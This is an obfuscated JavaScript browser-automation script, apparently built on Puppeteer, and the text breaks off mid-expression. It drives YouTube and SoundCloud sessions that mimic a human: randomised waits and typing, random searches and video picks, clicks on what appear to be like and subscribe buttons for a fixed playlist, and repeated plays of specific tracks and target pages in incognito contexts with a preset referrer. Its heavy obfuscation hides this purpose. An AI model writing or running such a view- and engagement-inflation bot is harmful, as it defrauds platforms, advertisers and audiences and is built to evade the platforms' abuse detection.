const a1 = c,
  a0 = b,
  Z = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xc3 * 0x1 + -0x1ea2 + 0x1de0))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xea8 + 0x9f1 * -0x1 + 0x1899), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x6 * -0xd9a + 0x2800 * 0x2 + 0x1636 * -0x2 + (-0x1 * 0xa24 + -0x6cf1 * -0x1 + -0x2835) * random()) : await standardWaitForNetIdle(f), await wait(0x1 * -0x1619 + 0x7 * -0xeb + -0x2 * -0x1807 + (-0x1f9e + -0xd * 0x511 + 0x888b * 0x1) * random()), -0x2 * -0x10d0 + -0x5ef + 0x376 * -0x8;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xab8 + -0x2 * 0x78 + 0x1f30), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x541 * 0x4 + 0x260 * -0x1 + -0x12a3;
}
async function randomWait() {
  return await wait(0x385 + -0x4c * 0x71 + 0x318f + (-0x201b + 0xcff * 0x3 + 0xca6) * random()), 0x1 * -0x15a3 + 0xc6d * -0x2 + 0x2e7e;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + R(0x1e)))['slice'](-0x186 * 0x2 + -0x1497 + 0x7e1 * 0x3, 0x1cdf + 0x7d7 + -0x24af), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x15e7 + -0xcc * 0x8e + 0x1716f) * getRandomInt(-0x1156 + 0x11ea * 0x1 + 0x2 * -0x49, 0x9b9 * -0x2 + -0x1823 + 0x2b9a * 0x1), h)), 0x1b63 + -0x6d7 + -0x148b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2172 + 0x194c + -0x3abe;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xc5d + -0x3 * 0x66e + -0x1fa8 * -0x1]['split']('\x20');
    for (let k = -0x866 * 0x2 + -0x1d7d + 0x29 * 0x121; k < i['length']; k += -0xe21 * 0x2 + -0x1 * -0x1286 + 0x9be)
      j += i[k] * h[i[k + (0xf * -0x7a + -0x5 * -0x3d6 + -0xc07)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te'](S(0x2, 'csT(')))['slice'](-0x19d1 + -0xf * -0xd6 + -0x5 * -0x2a9)['map'](l => Array['from'](l['children']))['flat'](-0x2 * -0x11ed + 0x1577 + -0x3950)['map'](l => l['childNodes'][0x85 * -0x7 + 0x2 * -0xd5d + 0x1e5e]['childNodes'][-0x4c7 + 0x1 * -0x17e3 + 0x2 * 0xe55]['childNodes'][0x1 * 0x1b1 + -0x15fa + -0x7 * -0x2e6]['childNodes'][-0x36b + -0xd7 * 0x7 + 0x94c]['childNodes'][0x183 + 0x9f7 + 0x10b * -0xb]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x50 * -0x1b + -0x49 * -0x2b + 0x15, 0x1 * 0x1bca + -0x1c47 + 0x1405)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5c64 + 0x5601 * -0x1 + 0xecfd);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1a6d1 + 0x1 * -0xef2f + -0x1 * -0x38060) * getRandomInt(-0xe * 0x137 + 0x2 * -0x12aa + -0x94 * -0x5e, -0x4c * -0x3b + -0xb33 * -0x1 + -0x1cb2 * 0x1), h);
  return await wait(i), -0x254f * 0x1 + -0x266c + 0x4bbc;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const T = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h[T(0x4, 'V]m5')])])['children'][-0xca6 + 0xd8d * -0x1 + 0x1a33]['children'][0xc99 + 0x76 * -0x22 + 0x313]['children'][0x1e39 + -0x63 * -0xf + -0x2 * 0x1203]['children'][-0x1 * 0x15ff + 0xae8 * -0x1 + -0x1 * -0x20e7]['children'][0xfb * 0x3 + 0xc * 0x16b + 0x189 * -0xd]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x95 * 0x17 + 0xedc * 0x2 + -0x1054;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x8f4 + -0x1f5c + -0x16cc * -0x1 + (0x237 + -0x2 * 0x126a + 0x1d5 * 0x13) * random()
  }), await wait(0xec0 + -0xadb + 0x1f1 * -0x1 + (0x1675 + 0x10c1 * -0x1 + -0x488) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1f2c + -0x3 * -0xbb9 + 0x4255 * -0x1]['childNodes'][0x21b8 + -0x340 + -0x1e77]['childNodes'][0x1 * 0x2437 + 0x12c8 + -0x36fe]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x701 * -0x1 + -0x1927 + 0x202d]['childNodes'][-0x1365 + -0x13 * -0x2b + 0x1034]['childNodes'][-0x1e26 + -0x680 + 0x24a8]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x559 * -0x7 + 0x204e + -0x45bc),
          r = -0x11e3 * -0x1 + -0x1052 + 0x1 * -0x191;
        for (let u = 0x3fb * -0x7 + 0xe5b + 0x1a * 0x85; u < q['length']; u += -0xdcf * -0x1 + -0xd * 0x167 + -0x1b * -0x2a)
          r += q[u] * k[q[u + (-0x1e1 * -0x1 + -0x2034 + 0x1e54)]];
        return r;
      }(n);
  });
  await wait((-0x1396 + -0x360d + 0x1 * 0x843b) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1a81c + 0xe0f + -0x1d1d * 0x7) * getRandomInt(0x166e + 0x118 * 0x20 + -0x396d, 0x182b + 0x258f + -0x3db0), h + (0x17e2 + -0x4 * -0x2f + 0x2 * -0x28b));
  return await wait(i), 0x2 * 0x78d + -0x2275 + -0x2c4 * -0x7;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x261b + 0x1f21 + -0x453c);
    let h = e[f];
    if (b['JKXnSW'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xe * -0x18e + -0x1be0 + 0x11 * 0x5c, s, t, u = 0x21f7 + 0x205f + 0x1 * -0x4256; t = n['charAt'](u++); ~t && (s = r % (-0x1ea2 * 0x1 + 0xccf + 0x11d7) ? s * (0x9f1 * -0x1 + -0x1d78 + 0xd * 0x30d) + t : t, r++ % (0x11a7 * 0x1 + 0x2d2 * -0x5 + -0x389)) ? p += String['fromCharCode'](0x2450 + -0x6e6 * -0x3 + -0x3803 & s >> (-(0x1 * -0x1619 + 0x7 * -0xeb + -0xb * -0x298) * r & -0xfcf + -0x1 * 0x20ef + 0x30c4 * 0x1)) : -0x2 * -0x10d0 + -0x5ef + 0x1a1 * -0x11) {
          t = o['indexOf'](t);
        }
        for (let v = -0xab8 + -0x2 * 0x78 + 0xba8, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x541 * 0x4 + 0x260 * -0x1 + -0x1294))['slice'](-(0x385 + -0x4c * 0x71 + 0x1e09));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x201b + 0xcff * 0x3 + -0x6e2,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * -0x15a3 + 0xc6d * -0x2 + 0x2e7d; u < -0x186 * 0x2 + -0x1497 + 0x77 * 0x35; u++) {
          p[u] = u;
        }
        for (u = 0x1cdf + 0x7d7 + -0x24b6; u < -0x1d3 + -0x47 * 0x22 + 0xc41; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1156 + 0x11ea * 0x1 + 0x9 * 0xc), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x9b9 * -0x2 + -0x1823 + 0x2b95 * 0x1, q = 0x1b63 + -0x6d7 + -0x148c;
        for (let v = 0x2172 + 0x194c + -0x3abe; v < n['length']; v++) {
          u = (u + (-0xc5d + -0x3 * 0x66e + -0x1fa8 * -0x1)) % (-0x866 * 0x2 + -0x1d7d + 0x2d * 0x10d), q = (q + p[u]) % (-0xe21 * 0x2 + -0x1 * -0x1286 + 0xabc), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xf * -0x7a + -0x5 * -0x3d6 + -0xb08)]);
        }
        return t;
      };
      b['dxJQoX'] = m, c = arguments, b['JKXnSW'] = !![];
    }
    const j = e[-0x19d1 + -0xf * -0xd6 + -0xb * -0x135],
      k = f + j,
      l = c[k];
    return !l ? (b['kDjPLS'] === undefined && (b['kDjPLS'] = !![]), h = b['dxJQoX'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x2159 + 0x8f * 0x3a + -0x51 * -0x3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const U = c;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.[U(0x13) + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x9d * 0x3d + 0x1a43 + 0x16de + (-0x1 * -0xc0d + -0x55 * -0x47 + 0x46 * -0x74) * Math['random']());
    });
  }, -0x201d + -0x100f * -0x2 + -0x3 * -0x91d);
  await wait(-0x5f6 * 0xf2 + 0x1f * 0x496f + 0x151fb);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x14a99 + -0x821 * -0x7 + -0x8c * 0x118) * getRandomInt(0x2437 + 0x4e1 * -0x1 + -0x1f52, -0x19a * -0x13 + 0x8e9 + -0x273e * 0x1)), clearInterval(h), -0x1 * 0xb2d + 0x2 * 0xb7b + -0xbc8;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x278 + 0x1 * -0x1a07 + 0x25 * 0xa3;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x143a + 0x1e5b + -0xa20;
    await randomWait();
  }
  return 0x8d * 0x35 + 0x114c + -0x2e7c;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x261b + 0x1f21 + -0x453c);
    let h = e[f];
    if (c['QNopMO'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xe * -0x18e + -0x1be0 + 0x11 * 0x5c, r, s, t = 0x21f7 + 0x205f + 0x1 * -0x4256; s = m['charAt'](t++); ~s && (r = q % (-0x1ea2 * 0x1 + 0xccf + 0x11d7) ? r * (0x9f1 * -0x1 + -0x1d78 + 0xd * 0x30d) + s : s, q++ % (0x11a7 * 0x1 + 0x2d2 * -0x5 + -0x389)) ? o += String['fromCharCode'](0x2450 + -0x6e6 * -0x3 + -0x3803 & r >> (-(0x1 * -0x1619 + 0x7 * -0xeb + -0xb * -0x298) * q & -0xfcf + -0x1 * 0x20ef + 0x30c4 * 0x1)) : -0x2 * -0x10d0 + -0x5ef + 0x1a1 * -0x11) {
          s = n['indexOf'](s);
        }
        for (let u = -0xab8 + -0x2 * 0x78 + 0xba8, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x541 * 0x4 + 0x260 * -0x1 + -0x1294))['slice'](-(0x385 + -0x4c * 0x71 + 0x1e09));
        }
        return decodeURIComponent(p);
      };
      c['ihCrBh'] = i, b = arguments, c['QNopMO'] = !![];
    }
    const j = e[-0x201b + 0xcff * 0x3 + -0x6e2],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ihCrBh'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  const V = c;
  return Math['random']() <= -0x1b80 + 0x1512 + 0x66e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xddb + 0x1d4b + -0xf70 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + V(0x16) + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x293 * -0xf + -0x208 + 0x28a5 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xcca * 0x2 + 0x599 * 0x3 + -0x8c9 * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x86d1 * -0x1 + -0x14126 + 0x16a1d + getRandomInt(0x3b6c + -0x250f + 0x243b, -0x5a * -0x1cd + -0xa * -0x5e + -0x308e));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x65 * -0x29 + 0x1297 * -0x1 + 0x22c5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x3 * 0xc56 + 0xb0f + 0x19f3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xb92 * 0x2 + 0x99f * 0x1 + 0xd85, -0x5ab * 0x4 + 0x2066 * 0x1 + -0x988)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x18e6 + 0x1489 + -0x259f + floor((0x1498 + -0x2035 + -0x89 * -0x1d) * random()))), log('p2'), log(await s['evaluate'](() => {
        const Y = b,
          X = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2 * 0x41cb2c31 + 0xb000c948 + -0xb39721aa),
          -0x10c9 * 0xc59 + -0x18 * -0x4244e + -0x47 * -0x35267,
          0x2 * -0x521b + 0x7 * -0x230a + -0x4 * -0x865f,
          0x1 * -0x1592 + 0xe17 + 0x7fb * 0x1
        ], y = [
          0xe09 * -0x1 + 0x610 * 0x3 + 0x1 * -0x40f,
          -0x15f7 * -0x1 + 0x266 * 0x8 + 0x2917 * -0x1,
          0xf81 + -0x4b2 + -0xac7,
          -0x1 * 0x26cb + 0x1232 + 0x1 * 0x1499
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x452 + -0x1f28 + -0x1ad7 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2285 + 0x13fb + -0x3680 * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x125b + -0x2678 * -0x1 + 0xd * -0x45f) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const W = c;
              J ? (A[0xfd6 * -0x2 + 0x9df * -0x1 + -0xdd9 * -0x3] = A[-0x1aa6 * 0x1 + 0xb23 + 0x3 * 0x531] = A[0x16 * 0x43 + 0x2687 + -0x2c48] = A[0x1f54 + 0x50c + -0x245e] = A[-0x2 * 0x1208 + 0x621 * 0x1 + 0x2 * 0xef9] = A[0x4bf + -0xc89 * -0x1 + -0x1144] = A[-0x326 + 0x2001 * -0x1 + -0x232c * -0x1] = A[0x893 + 0x264f + -0x2edc] = A[0x1 * 0x174b + 0x311 + -0x1a55] = A[-0x11b9 * 0x1 + -0x19e0 + 0x2ba1] = A[-0x34c + 0xf50 + 0x1 * -0xbfb] = A[0x26a2 + -0x6a8 * 0x1 + -0xe * 0x248] = A[0x76 * 0x42 + -0x1 * -0xb0e + 0x1 * -0x296f] = A[0x2d8 + -0x5 * -0x21e + -0xd62] = A[-0x13 * 0x125 + 0x10 * -0x25a + -0xedb * -0x4] = A[0x13c + 0x11fe + -0x132c] = A[-0xe94 + -0x10a * -0x22 + 0x14b1 * -0x1] = 0x39d + 0x173a + -0x1ad7 * 0x1, this['blocks'] = A) : this['blocks'] = [
                -0x1d09 + 0x2 * 0x3b9 + -0x1597 * -0x1,
                -0x14e3 + -0x1110 + -0x25f3 * -0x1,
                -0x1e2 * -0xb + -0x17f1 + 0x33b,
                -0x8b5 * -0x1 + 0x174e + -0x2003,
                -0x643 + 0xf8 * -0x5 + 0xb1b * 0x1,
                -0x2ee + 0x979 + 0x5 * -0x14f,
                0x14c0 + 0x1 * 0x1735 + -0x2bf5,
                -0x1091 + 0x15a1 + -0x510,
                -0x1 * 0xeaf + -0xcd0 * -0x3 + -0x17c1,
                0x4 * -0x5be + 0x461 + -0x1297 * -0x1,
                0xeaa + -0xb * 0x293 + 0xda7,
                0x255 * 0x9 + 0x1 * -0xcf + -0x142e,
                -0x20b3 * 0x1 + -0xe02 + 0x2eb5,
                -0x3c7 + 0xbf * -0x21 + 0x5 * 0x5ae,
                0x1392 + 0x26 * -0x104 + 0x1306,
                0xc2 * -0x1 + -0x80f + 0x1 * 0x8d1,
                0x20a6 + -0x65f * -0x4 + -0x3a22
              ], this['h0'] = -0x13fbeb6 * 0xc + 0xc65bca8f * -0x1 + 0x13c9dde18, this['h1'] = -0x11329913b + -0x15b36902d + 0x35e2dccf1, this['h2'] = -0x6097f444 + 0xdc5c846d * -0x1 + 0x1d5af55af, this['h3'] = -0x14 * 0x10b0671 + 0x61cea0d * -0x2 + 0x3148a964, this['h4'] = 0x187dee * 0x6d9 + -0xe6 * 0x19b5327 + -0x9d * -0x2886a6c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xc * 0x21d + 0x28b + 0x16d1, this['finalized'] = this[W(0x3)] = 0x1 * 0x8bb + 0x1 * 0x1bd2 + -0x248d, this['first'] = 0x625 + -0x1a21 * 0x1 + 0x13fd * 0x1;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x23c1 + -0x1 * 0x2207 + 0x2 * -0xdd, O = J['length'] || 0xc34 + 0x1 * 0x1b9f + -0x27d3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x32 * -0x41 + 0x18 * -0x7a + 0x2 * -0xa1, P[-0x9 * -0xab + -0x23d0 + 0x3 * 0x9ef] = this['block'], P[-0x8ec + -0x237b + 0x2c77] = P[0x1 * 0x215b + -0x1 * -0x2636 + -0x4790] = P[0x212e + 0x1c76 * 0x1 + -0x3da2] = P[-0x6b3 * 0x1 + 0x29 * -0x62 + 0x1668 * 0x1] = P[-0x2 * 0xa85 + 0x1eb + 0x1323] = P[-0x2 * -0xb02 + 0xc6d + -0x226c] = P[0x2118 + 0x23bb + 0x9 * -0x7a5] = P[0x1487 + -0x236f * -0x1 + 0x6f * -0x81] = P[0x5 * -0x31 + 0x1625 + 0xa94 * -0x2] = P[-0x11f * -0xd + -0x11a8 + -0x6 * -0x85] = P[-0x3e * 0x93 + -0x3fb * -0x3 + -0x17b3 * -0x1] = P[0x11bf + -0x263a + -0x25 * -0x8e] = P[0x25c9 + 0x1 * -0x18fd + -0xcc0] = P[0x1c08 + -0xb10 + -0x10eb] = P[0x16e6 + -0x1909 + -0xb * -0x33] = P[-0x2681 + -0x43 * 0x18 + 0x2cd8] = 0x2 * 0xe4b + -0xaf * 0x23 + -0x1 * 0x4a9), K) {
                    for (N = this['start']; M < O && N < -0x467 + -0x248a + -0xdbb * -0x3; ++M)
                      P[N >> 0x992 * 0x1 + 0x1025 * -0x1 + 0x1 * 0x695] |= J[M] << y[0x6 * 0x4 + -0x2333 * -0x1 + -0x2348 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x331 + -0x11 * 0x1ff + 0x1efe; ++M)
                      (L = J['charCodeAt'](M)) < 0x24b1 + -0x233d + -0x4 * 0x3d ? P[N >> -0x1 * 0x927 + 0x1 * 0x1db9 + 0xa48 * -0x2] |= L << y[0x132 * 0x10 + -0x1370 + 0x53 & N++] : L < 0x1ef7 * -0x1 + 0x2 * -0x11ba + -0x4a6b * -0x1 ? (P[N >> -0x24 * 0x2e + 0x2 * 0x48e + -0x1 * 0x2a2] |= (0x400 * -0x9 + 0x23 * -0x107 + -0x1 * -0x48b5 | L >> -0x1c5b + 0xed + -0xfb * -0x1c) << y[-0x1883 + -0x5b * 0x43 + 0x3057 & N++], P[N >> 0x2314 + 0xc01 * -0x2 + -0x588 * 0x2] |= (0x2455 * 0x1 + 0x31 * 0xf + -0x26b4 | -0x1 * -0x8ad + 0xd55 + 0x26b * -0x9 & L) << y[0x166b * 0x1 + 0x2531 + -0xb * 0x56b & N++]) : L < -0xd135 + -0x17e1e + 0x32753 || L >= 0x1 * -0x4e23 + -0x1f * 0xb75 + -0x429 * -0x9e ? (P[N >> 0x7da + 0x19b0 + 0x4a * -0x74] |= (0x1 * 0x217b + -0x2da * -0x2 + -0x264f | L >> 0x4 * 0x34e + 0xdb8 + -0x6b9 * 0x4) << y[0x5cb * -0x2 + 0x184d + 0x2 * -0x65a & N++], P[N >> -0x89 + -0x24bb + -0x2de * -0xd] |= (0x127c + -0xcac * -0x1 + -0x1ea8 | L >> -0x200b + -0xc * -0x1bb + 0xb * 0x107 & -0x234c + 0x248f + -0x104) << y[0x1 * 0x2265 + -0x250 + -0x2012 & N++], P[N >> -0x1cd + -0x135 * -0x3 + 0x10 * -0x1d] |= (-0x4e1 * 0x4 + -0x35 * 0x8e + 0x9e2 * 0x5 | -0xf66 + 0x6d * -0x52 + 0x7 * 0x739 & L) << y[-0x1dd0 + -0x9b7 * 0x1 + 0x3 * 0xd2e & N++]) : (L = 0x141ad + -0xbcb5 + 0x7b08 + ((0xc4c + -0x20cf * 0x1 + 0x1882 & L) << -0x103 + 0xa2e * -0x2 + 0x3 * 0x723 | 0xaad + 0x237d + -0x2a2b & J['charCodeAt'](++M)), P[N >> -0x5 * -0x2b0 + -0x959 + -0x415 * 0x1] |= (-0x1358 + 0x2b * 0xe2 + -0x11ae | L >> 0x1326 * 0x1 + 0x3 * 0x52e + 0x6 * -0x5c5) << y[-0x55 * -0x1f + -0x20e + -0x83a & N++], P[N >> 0x724 * -0x3 + 0x2129 + -0x8f * 0x15] |= (-0x3 * -0xc6d + -0x2d * 0x1 + -0x249a | L >> 0x2 * 0x85a + -0x17f2 + 0x74a & -0x228d + 0x495 + 0x1 * 0x1e37) << y[-0x145 * -0xb + 0x15ee + 0xbf6 * -0x3 & N++], P[N >> -0x7a5 * 0x5 + -0x976 + -0x1d * -0x1a5] |= (0x1f3d * -0x1 + -0x98f * 0x4 + 0x45f9 | L >> 0x1 * -0x8b + -0x1a7f + 0x1b10 & 0x95f * 0x3 + 0x1013 + 0x2bf1 * -0x1) << y[0x59e + 0x4e3 + -0xa7e & N++], P[N >> -0xbf * 0x9 + -0x1 * -0xe9b + 0x3f1 * -0x2] |= (-0x2e * 0x13 + 0x1 * 